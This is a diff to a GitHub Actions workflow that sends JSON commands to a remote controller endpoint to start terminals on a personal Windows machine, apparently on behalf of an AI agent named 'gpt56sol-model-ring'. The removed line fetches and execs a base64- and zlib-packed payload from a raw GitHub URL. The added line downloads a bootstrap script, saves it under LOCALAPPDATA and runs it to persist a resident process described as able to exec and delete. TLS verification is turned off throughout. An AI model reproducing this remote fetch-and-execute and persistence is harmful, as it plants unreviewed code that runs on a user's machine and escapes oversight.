@@ -9,7 +9,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 3
     steps:
-      - name: Build fresh model-native SPSC ring v3
+      - name: Install and prove model-native SPSC ring
         shell: bash
         run: |
           set -euo pipefail
@@ -17,25 +17,31 @@ jobs:
           mkdir -p /tmp/archie-hotwire
           python - <<'PY' > /tmp/archie-hotwire/start.json
           import json
-          code="import urllib.request,base64,zlib;s=urllib.request.urlopen('https://raw.githubusercontent.com/Pokitomas/archie-backend-xfer-1787735782/master/model_ring_payload.b64',timeout=20).read();exec(zlib.decompress(base64.b64decode(s)))"
-          print(json.dumps({"action":"controller.action","spec":{"action":"native_terminal","op":"start","argv":[r"C:\Users\AwesomeKai\AppData\Local\Programs\Python\Python312\python.exe","-c",code],"agent":"gpt56sol-model-ring","role":"execute","intent":"install fresh model-native named-shared-memory SPSC ring, self-test, persist, then retire only superseded scratch after PASS"}},separators=(',',':')))
+          code="import urllib.request,pathlib,subprocess,sys,os;u='https://raw.githubusercontent.com/Pokitomas/archie-backend-xfer-1787735782/master/model_ring_bootstrap.py';d=urllib.request.urlopen(u,timeout=20).read();p=pathlib.Path(os.environ.get('LOCALAPPDATA',str(pathlib.Path.home())))/'ModelRing'/'model_ring.py';p.parent.mkdir(parents=True,exist_ok=True);p.write_bytes(d);raise SystemExit(subprocess.run([sys.executable,str(p),'--bootstrap']).returncode)"
+          print(json.dumps({"action":"controller.action","spec":{"action":"native_terminal","op":"start","argv":[r"C:\Users\AwesomeKai\AppData\Local\Programs\Python\Python312\python.exe","-c",code],"agent":"gpt56sol-model-ring","role":"execute","intent":"install fresh local shared-memory SPSC resident, prove ping/write/read/exec/delete, persist it, then retire superseded scratch only after PASS"}},separators=(',',':')))
           PY
           curl -k -L --max-time 25 -sS -H 'content-type: application/json' --data-binary @/tmp/archie-hotwire/start.json "$root" > /tmp/archie-hotwire/start-result.json
           sleep 9
           python - <<'PY' /tmp/archie-hotwire/start-result.json > /tmp/archie-hotwire/poll-request.json
           import json,sys
           v=json.load(open(sys.argv[1])); r=v.get('result') or {}; inner=(r.get('result') or r) if isinstance(r,dict) else {}; tid=inner.get('terminal_id')
-          print(json.dumps({"action":"controller.action","spec":{"action":"native_terminal","op":"poll","terminal_id":tid,"agent":"gpt56sol-model-ring","role":"measure","intent":"read ring build/selftest/deletion receipt"}},separators=(',',':')))
+          print(json.dumps({"action":"controller.action","spec":{"action":"native_terminal","op":"poll","terminal_id":tid,"agent":"gpt56sol-model-ring","role":"measure","intent":"read final model-ring selftest and deletion receipt"}},separators=(',',':')))
           PY
           curl -k -L --max-time 25 -sS -H 'content-type: application/json' --data-binary @/tmp/archie-hotwire/poll-request.json "$root" > /tmp/archie-hotwire/poll.json || true
-          python - <<'PY' > /tmp/archie-hotwire/status-start.json
+          python - <<'PY' > /tmp/archie-hotwire/ping-start.json
           import json
-          code=r"import pathlib; p=pathlib.Path(r'C:\Users\AwesomeKai\AppData\Local\ModelRing\status.json'); print(p.read_text(encoding='utf-8') if p.exists() else 'NO_STATUS')"
-          print(json.dumps({"action":"controller.action","spec":{"action":"native_terminal","op":"start","argv":[r"C:\Users\AwesomeKai\AppData\Local\Programs\Python\Python312\python.exe","-c",code],"agent":"gpt56sol-model-ring","role":"measure","intent":"independent readback of resident model-ring status"}},separators=(',',':')))
+          print(json.dumps({"action":"controller.action","spec":{"action":"native_terminal","op":"start","argv":[r"C:\Users\AwesomeKai\AppData\Local\Programs\Python\Python312\python.exe",r"C:\Users\AwesomeKai\AppData\Local\ModelRing\model_ring.py","call","{\"op\":\"ping\"}"],"agent":"gpt56sol-model-ring","role":"measure","intent":"independent post-install SPSC round trip"}},separators=(',',':')))
           PY
-          curl -k -L --max-time 25 -sS -H 'content-type: application/json' --data-binary @/tmp/archie-hotwire/status-start.json "$root" > /tmp/archie-hotwire/status-start-result.json || true
+          curl -k -L --max-time 25 -sS -H 'content-type: application/json' --data-binary @/tmp/archie-hotwire/ping-start.json "$root" > /tmp/archie-hotwire/ping-start-result.json || true
+          sleep 2
+          python - <<'PY' /tmp/archie-hotwire/ping-start-result.json > /tmp/archie-hotwire/ping-poll-request.json
+          import json,sys
+          v=json.load(open(sys.argv[1])); r=v.get('result') or {}; inner=(r.get('result') or r) if isinstance(r,dict) else {}; tid=inner.get('terminal_id')
+          print(json.dumps({"action":"controller.action","spec":{"action":"native_terminal","op":"poll","terminal_id":tid,"agent":"gpt56sol-model-ring","role":"measure","intent":"capture independent SPSC ping result"}},separators=(',',':')))
+          PY
+          curl -k -L --max-time 25 -sS -H 'content-type: application/json' --data-binary @/tmp/archie-hotwire/ping-poll-request.json "$root" > /tmp/archie-hotwire/ping-poll.json || true
       - uses: actions/upload-artifact@v4
         with:
-          name: model-ring-final-v3
+          name: model-ring-final-v4
           path: /tmp/archie-hotwire
           retention-days: 1
